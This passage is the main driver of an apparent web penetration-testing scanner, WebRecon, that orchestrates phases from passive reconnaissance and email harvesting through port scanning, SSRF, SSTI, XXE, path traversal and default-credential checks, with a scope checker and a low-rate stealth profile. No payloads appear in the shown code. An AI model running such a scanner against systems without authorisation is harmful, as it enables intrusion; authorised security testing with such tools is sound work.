    p.add_argument("--no-intrusive",        action="store_true",
                   help="Skip intrusive checks (Nikto, nuclei intrusive tags, etc.)")
    p.add_argument("--nuclei-severity",     default="medium,high,critical",
                   help="Nuclei severity filter (default: medium,high,critical)")
    p.add_argument("--no-html",             action="store_true", help="Skip HTML report generation")
    return p.parse_args()


def _apply_profile(args, cfg: ScanConfig) -> ScanConfig:
    """Mutate cfg based on chosen scan profile."""
    if cfg.profile == ScanProfile.STEALTH:
        cfg.rate          = min(cfg.rate, 10)
        cfg.threads       = min(cfg.threads, 2)
        cfg.delay         = max(cfg.delay, 0.5)
        cfg.no_intrusive  = True
    elif cfg.profile == ScanProfile.RECON:
        cfg.no_intrusive  = True
    return cfg


def main():
    args = parse_args()

    print(f"\n{Fore.MAGENTA}{'═'*60}")
    print(f"{Fore.MAGENTA}  WebRecon v{VERSION}")
    print(f"{Fore.MAGENTA}{'═'*60}\n")

    raw = args.target or input(f"{Fore.CYAN}  Target (domain or IP): ").strip()
    target = normalise(raw)

    tt = validate(target)
    if not tt:
        print(f"{Fore.RED}  [!] Invalid target: {target!r}"); sys.exit(1)
    try:
        sanitise(target)
    except ValueError as e:
        print(f"{Fore.RED}  [!] {e}"); sys.exit(1)

    out       = args.output + ".md"
    findings  = args.output + ".findings.json"
    state_f   = args.output + ".state.json"
    html_path = args.output + ".report.html"

    scope = ScopeChecker(args.scope_file)
    if not scope.check(target):
        print(f"{Fore.RED}  [!] {target} is OUT OF SCOPE — aborting."); sys.exit(1)

    state = ScanState(state_f)
    if args.fresh:
        state.clear()
        print(f"{Fore.YELLOW}  [FRESH] State cleared.")

    # Build initial config so detect_scheme uses the auth/proxy settings
    cfg_stub = ScanConfig(
        target=target, target_type=tt, base_url=f"http://{target}",
        output_prefix=args.output,
        proxy=args.proxy, user_agent=args.user_agent, timeout=args.timeout,
        cookie=args.cookie, extra_headers=args.headers or [],
    )

    print(f"\n{Fore.CYAN}  Detecting scheme for {target}…")
    scheme = detect_scheme(target, cfg_stub)

    cfg = ScanConfig(
        target=target, target_type=tt,
        base_url=f"{scheme}://{target}",
        output_prefix=args.output,
        proxy=args.proxy,
        user_agent=args.user_agent,
        timeout=args.timeout,
        oob_url=args.oob_url,
        scope_file=args.scope_file,
        auto=args.auto,
        rate=args.rate,
        delay=args.delay,
        full_ports=args.full_ports,
        google_api_key=args.google_api_key,
        google_cx=args.google_cx,
        google_dork_count=args.google_dork_count,
        diff_file=args.diff_file,
        threads=args.threads,
        verbose=args.verbose,
        cookie=args.cookie,
        extra_headers=args.headers or [],
        auth_check_url=args.auth_check_url,
        auth_check_text=args.auth_check_text,
        webhook_url=args.webhook_url,
        webhook_threshold=Severity[args.webhook_threshold],
        pentestdb_url=args.pentestdb_url,
        pentestdb_token=args.pentestdb_token,
        profile=ScanProfile(args.profile),
        no_intrusive=args.no_intrusive,
        nuclei_severity=args.nuclei_severity,
        html_report=not args.no_html,
    )
    cfg = _apply_profile(args, cfg)

    start = datetime.now()

    if not (args.resume and os.path.exists(out)):
        with open(out, 'w') as fh:
            fh.write(f"# WebRecon Report\n\n"
                     f"| | |\n|---|---|\n"
                     f"| **Target** | `{target}` ({tt.value}) |\n"
                     f"| **Base URL** | {cfg.base_url} |\n"
                     f"| **Profile** | {cfg.profile.value} |\n"
                     f"| **Started** | {start.isoformat()} |\n"
                     f"| **Tool** | WebRecon v{VERSION} |\n\n---\n")
    else:
        _log(out, f"\n\n---\n*Resumed at {start.isoformat()}*\n")

    print(f"\n{Fore.CYAN}  Target:   {target} ({tt.value})")
    print(f"{Fore.CYAN}  Base URL: {cfg.base_url}")
    print(f"{Fore.CYAN}  Profile:  {cfg.profile.value}")
    print(f"{Fore.CYAN}  Output:   {out}")
    if cfg.proxy:        print(f"{Fore.CYAN}  Proxy:    {cfg.proxy}")
    if cfg.oob_url:      print(f"{Fore.CYAN}  OOB:      {cfg.oob_url}")
    if cfg.cookie:       print(f"{Fore.CYAN}  Auth:     cookie provided")
    if cfg.webhook_url:  print(f"{Fore.CYAN}  Webhook:  configured (≥{cfg.webhook_threshold.value})")
    if cfg.pentestdb_url:print(f"{Fore.CYAN}  PentestDB:{cfg.pentestdb_url}")
    if not _is_root():
        print(f"\n{Fore.YELLOW}  ⚠ Not root — nmap OS detection will use sudo.")

    # Verify initial session if auth configured
    if cfg.auth_check_url:
        revalidate_session(cfg, out)

    # Shortcut: is profile restrictive?
    is_recon_only = cfg.profile == ScanProfile.RECON
    is_at_least_active = cfg.profile in (ScanProfile.ACTIVE, ScanProfile.FULL, ScanProfile.STEALTH)
    is_full = cfg.profile in (ScanProfile.FULL, ScanProfile.STEALTH)

    detected_tech: Dict = {}

    try:
        # ── Phase 1: Passive ──────────────────────────────────────────────
        print(f"\n{Fore.MAGENTA}[ PHASE 1 — PASSIVE RECONNAISSANCE ]")
        with ThreadPoolExecutor(max_workers=4) as pool:
            futs = {
                pool.submit(phase_passive_dns, target, tt, cfg, out, state, scope): "dns",
                pool.submit(phase_cert_transparency, target, tt, cfg, out, state):  "crt.sh",
                pool.submit(phase_wayback, target, cfg, out, state):                "wayback",
                pool.submit(phase_google_dorks, target, cfg, out, state):           "dorks",
            }
            for fut in as_completed(futs):
                try: fut.result()
                except Exception as e: print(f"  {Fore.RED}✗ {futs[fut]}: {e}")

        phase_email_harvest(target, tt, cfg, out, state)
        phase_subdomain_enum(target, tt, cfg, out, state, scope)
        phase_favicon_hash(target, cfg, out, state)

        if is_recon_only:
            print(f"\n{Fore.YELLOW}[ Profile=recon → skipping active/vuln phases ]")
        else:
            # ── Phase 2: Active ───────────────────────────────────────────
            print(f"\n{Fore.MAGENTA}[ PHASE 2 — ACTIVE RECONNAISSANCE ]")
            phase_port_scan(target, cfg, out, state)
            with ThreadPoolExecutor(max_workers=2) as pool:
                futs = {
                    pool.submit(phase_waf_cdn, target, cfg, out, state):    "waf",
                    pool.submit(phase_vhost_fuzz, target, cfg, out, state): "vhost",
                }
                for fut in as_completed(futs):
                    try: fut.result()
                    except Exception as e: print(f"  {Fore.RED}✗ {futs[fut]}: {e}")

            # ── Phase 3: Technology & Content ─────────────────────────────
            print(f"\n{Fore.MAGENTA}[ PHASE 3 — TECHNOLOGY & CONTENT DISCOVERY ]")
            detected_tech = phase_tech_detection(target, cfg, out, state)
            phase_tech_playbooks(target, cfg, out, state, detected_tech)
            phase_robots_sitemap(target, tt, cfg, out, state)
            phase_crawler(target, cfg, out, state)
            phase_content_discovery(target, cfg, out, state)
            phase_param_discovery(target, cfg, out, state)

            # ── Phase 4: HTTP Analysis ─────────────────────────────────────
            print(f"\n{Fore.MAGENTA}[ PHASE 4 — HTTP ANALYSIS ]")
            with ThreadPoolExecutor(max_workers=3) as pool:
                futs = {
                    pool.submit(phase_header_analysis, target, cfg, out, state): "headers",
                    pool.submit(phase_cors, target, cfg, out, state):             "cors",
                    pool.submit(phase_oauth_oidc, target, cfg, out, state):       "oidc",
                }
                for fut in as_completed(futs):
                    try: fut.result()
                    except Exception as e: print(f"  {Fore.RED}✗ {futs[fut]}: {e}")

            phase_host_header(target, cfg, out, state)
            phase_crlf(target, cfg, out, state)
            phase_jwt_analysis(target, cfg, out, state)

            if is_full:
                # ── Phase 5: Vulnerability Scanning ─────────────────────────
                print(f"\n{Fore.MAGENTA}[ PHASE 5 — VULNERABILITY SCANNING ]")
                phase_ssl_tls(target, cfg, out, state)
                phase_nikto(target, cfg, out, state)
                phase_nuclei(target, cfg, out, state)
                with ThreadPoolExecutor(max_workers=4) as pool:
                    futs = {
                        pool.submit(phase_js_analysis, target, cfg, out, state):    "js",
                        pool.submit(phase_graphql, target, cfg, out, state):        "graphql",
                        pool.submit(phase_path_traversal, target, cfg, out, state): "lfi",
                        pool.submit(phase_open_redirect, target, cfg, out, state):  "redirect",
                    }
                    for fut in as_completed(futs):
                        try: fut.result()
                        except Exception as e: print(f"  {Fore.RED}✗ {futs[fut]}: {e}")

                phase_ssrf(target, cfg, out, state)
                phase_ssti(target, cfg, out, state)
                phase_xxe(target, cfg, out, state)
                phase_default_creds(target, cfg, out, state)

                # ── Phase 6: Infrastructure ──────────────────────────────────
                print(f"\n{Fore.MAGENTA}[ PHASE 6 — INFRASTRUCTURE ]")
                with ThreadPoolExecutor(max_workers=2) as pool:
                    futs = {
                        pool.submit(phase_cloud_buckets, target, cfg, out, state): "buckets",
                        pool.submit(phase_screenshots, target, cfg, out, state):   "screenshots",
                    }
                    for fut in as_completed(futs):
                        try: fut.result()
                        except Exception as e: print(f"  {Fore.RED}✗ {futs[fut]}: {e}")

    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}  Interrupted — state saved. Re-run with --resume to continue.")
        _log(out, "\n\n---\n*Scan interrupted by user.*")

    except Exception as e:
        import traceback
        print(f"{Fore.RED}  Fatal: {e}")
        traceback.print_exc()

    finally:
        save_findings(_findings, findings)
        write_summary(cfg, out, _findings, start)

        if cfg.html_report:
            try:
                write_html_report(cfg, html_path, _findings, start)
                print(f"{Fore.CYAN}  HTML:     {html_path}")
            except Exception as e:
                print(f"{Fore.YELLOW}  ⚠ HTML report failed: {e}")

        counts = Counter(f.severity for f in _findings)
        print(f"\n{Fore.MAGENTA}{'═'*60}")
        print(f"{Fore.GREEN}  Scan complete!")
        print(f"  {Fore.MAGENTA}{counts.get(Severity.CRITICAL,0)} CRIT  "
              f"{Fore.RED}{counts.get(Severity.HIGH,0)} HIGH  "
              f"{Fore.YELLOW}{counts.get(Severity.MEDIUM,0)} MED  "
              f"{Fore.GREEN}{counts.get(Severity.LOW,0)} LOW  "
              f"{Fore.CYAN}{counts.get(Severity.INFO,0)} INFO")
        print(f"{Fore.CYAN}  Report:   {out}")
        print(f"{Fore.CYAN}  Findings: {findings}")
        print(f"{Fore.MAGENTA}{'═'*60}\n")


if __name__ == "__main__":
    main()
